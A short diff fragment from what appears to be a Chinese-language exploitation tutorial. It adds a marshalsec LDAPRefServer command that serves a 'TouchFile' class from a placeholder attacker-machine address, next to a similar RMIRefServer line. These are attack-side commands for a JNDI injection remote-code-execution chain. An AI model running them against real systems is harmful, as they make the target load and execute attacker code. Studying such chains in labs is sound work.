@@ -107,7 +107,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 ![](https://img-blog.csdnimg.cn/44f5743c5377421088902a9d0c84f511.png)
 
 
-
+>  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://攻击机IP:8888/#TouchFile" 9999
 
 
 
